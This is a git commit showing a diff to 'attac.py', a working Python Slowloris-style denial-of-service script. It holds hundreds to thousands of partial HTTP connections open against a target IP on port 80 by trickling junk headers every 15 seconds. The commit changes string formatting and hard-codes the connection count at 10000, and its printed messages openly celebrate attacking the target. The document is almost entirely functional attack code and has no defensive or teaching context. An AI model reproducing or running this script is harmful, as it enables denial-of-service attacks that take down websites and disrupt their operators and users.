9b687105b85c1c8f690da8f9e2f107aaf523aa3d
SangaeLama <35286154+SangaeLama@users.noreply.github.com>
2020-05-25 02:53:08 +0545

    Add files via upload

--- attac.py
+++ attac.py
@@ -2,8 +2,7 @@ import socket, random, time, sys
 
 headers = [
     "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Accept-language: en-US,en"
-]
+    "Accept-language: en-US,en"]
 
 sockets = []
 
@@ -11,44 +10,43 @@ def setupSocket(ip):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(4)
     sock.connect((ip, 80))
-    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
+    sock.send(f"GET /?{random.randint(0, 1337)} HTTP/1.1\r\n".encode("utf-8"))
 
     for header in headers:
-        sock.send("{}\r\n".format(header).encode("utf-8"))
+        sock.send(f"{header}\r\n".encode("utf-8"))
 
     return sock
 
 if __name__ == "__main__":
 
     ip = sys.argv[1]
-    count = int(input("================== {} seems like hackable :D ================== \nEnter the magnitude of earthquake u wanna send to {}! ".format(ip,ip)))
-    print("\nAttacking {} !!!".format(ip))
+    print(f"================== {ip} seems like hackable :D ================== \nEnter the magnitude of earthquake u wanna send to {ip}! ")
+    count=10000
+    print(f"\nAttacking {ip} !!!")
 
     for _ in range(count):
         try:
-            print("Socket ready in {} {}".format(sys.argv[1],_))
+            print(f"Socket ready in {ip} {_}", end='\r')
             sock = setupSocket(ip)
         except socket.error:
             break
-
         sockets.append(sock)
 
     while True:
-        print("Connected to {} sockets. Sending headers...".format(len(sockets)))
-
+        print(f"Connected to {len(sockets)} sockets. Sending headers...")
         for sock in list(sockets):
             try:
-                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
+                sock.send(f"X-a: {random.randint(1, 4600)}\r\n".encode("utf-8"))
             except socket.error:
                 sockets.remove(sock)
 
         for _ in range(count - len(sockets)):
             print("Re-opening closed sockets...")
+            print(f"Current sockets: {len(sockets)}")
             try:
                 sock = setupSocket(ip)
                 if sock:
                     sockets.append(sock)
             except socket.error:
                 break
-
         time.sleep(15)
